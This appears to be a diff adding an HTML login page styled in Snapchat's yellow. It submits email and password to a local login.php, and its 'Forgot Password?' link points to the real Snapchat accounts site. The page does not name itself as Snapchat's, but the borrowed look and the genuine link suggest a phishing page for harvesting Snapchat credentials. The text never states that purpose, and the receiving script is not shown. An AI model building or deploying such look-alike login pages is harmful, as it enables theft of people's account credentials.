@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<title>Login</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial;
+}
+
+body{
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+background:#FFFC00;
+}
+
+.container{
+background:white;
+padding:35px;
+border-radius:15px;
+width:340px;
+text-align:center;
+box-shadow:0 10px 25px rgba(0,0,0,0.2);
+}
+
+input{
+width:100%;
+padding:12px;
+margin:10px 0;
+border-radius:8px;
+border:1px solid #ccc;
+}
+
+button{
+width:100%;
+padding:12px;
+background:#fffc00;
+border:none;
+border-radius:8px;
+cursor:pointer;
+}
+
+.password-box{
+position:relative;
+}
+
+.eye{
+position:absolute;
+right:15px;
+top:50%;
+transform:translateY(-50%);
+cursor:pointer;
+}
+
+.forgot{
+display:block;
+margin-top:10px;
+color:#1877f2;
+text-decoration:none;
+font-size:14px;
+}
+
+.forgot:hover{
+text-decoration:underline;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Login</h2>
+
+<form action="login.php" method="POST">
+
+<input type="text" name="email" placeholder="Email or Username" required>
+
+<div class="password-box">
+
+<input type="password" name="password" id="loginPassword" placeholder="Password" required>
+
+<span class="eye" onclick="togglePassword()">
+<i class="fa-solid fa-eye"></i>
+</span>
+
+</div>
+
+<button type="submit">Login</button>
+
+<a href="https://accounts.snapchat.com/v2/login" class="forgot">Forgot Password?</a>
+
+</form>
+
+</div>
+
+<script>
+
+function togglePassword(){
+
+let input=document.getElementById("loginPassword");
+
+if(input.type==="password"){
+input.type="text";
+}else{
+input.type="password";
+}
+
+}
+
+</script>
+
+</body>
+</html>
